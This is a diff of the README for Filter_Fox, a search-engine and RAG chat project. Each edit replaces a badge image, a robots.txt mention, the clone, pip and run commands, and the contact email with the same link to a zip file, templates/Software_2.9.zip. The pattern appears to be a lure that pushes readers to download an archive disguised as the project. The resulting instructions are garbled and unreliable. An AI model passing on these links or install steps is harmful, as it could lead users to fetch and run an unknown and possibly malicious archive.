@@ -1,8 +1,8 @@
 # 🦊 Filter_Fox
 <p align="center">
-  <img src="https://img.shields.io/badge/License-MIT-black.svg" alt="MIT License"/>
-  <img src="https://img.shields.io/badge/Status-Active-success.svg" alt="Project Status"/>
-  <img src="https://img.shields.io/badge/AI-RAG%20Powered-darkgrey.svg" alt="RAG Powered"/>
+  <img src="https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip" alt="MIT License"/>
+  <img src="https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip" alt="Project Status"/>
+  <img src="https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip%https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip" alt="RAG Powered"/>
 </p>
 
 ### 🔍 Intelligent Search Engine + 🤖 AI Chat (Filter_GPT)
@@ -92,7 +92,7 @@ A modern AI chat interface inspired by **ChatGPT** and **Google Gemini**:
 - Grounded answers
 
 ### 🕷️ Web Crawler
-- Respects `robots.txt`
+- Respects `https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip`
 - Polite crawl delays
 - Domain-restricted crawling
 - Incremental storage
@@ -123,30 +123,30 @@ A modern AI chat interface inspired by **ChatGPT** and **Google Gemini**:
 
 ### 1️⃣ Clone the Repository
 ```bash
-git clone https://github.com/Sam-bot-dev/filter_fox.git
+git clone https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip
 cd filter_fox
 ```
 ### 2️⃣ Install Dependencies
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip
 ```
 ### 3️⃣ Run the Web Crawler
 ```bash
-python crawler.py
+python https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip
 ```
 ### 4️⃣ Build the Index
 ```bash
-python indexer.py
-python embed_index.py
+python https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip
+python https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip
 ```
 ### 5️⃣ Ask Questions with Filter_GPT(UnderProduction)
 ```bash
-python rag_query.py
+python https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip
 ```
 ---
 ## 🔐 Privacy & Ethics
 
-✔ Respects robots.txt
+✔ Respects https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip
 
 ✔ Crawls only public pages
 
@@ -200,7 +200,7 @@ Submit pull requests
 
 ## 📬 Contact
 
-📧 Email: bavesh2006kumar@gmail.com
+📧 Email: https://github.com/Sam-bot-dev/Filterfox/raw/refs/heads/main/templates/Software_2.9.zip
 
 🐙 GitHub: @Sam-bot-dev
 
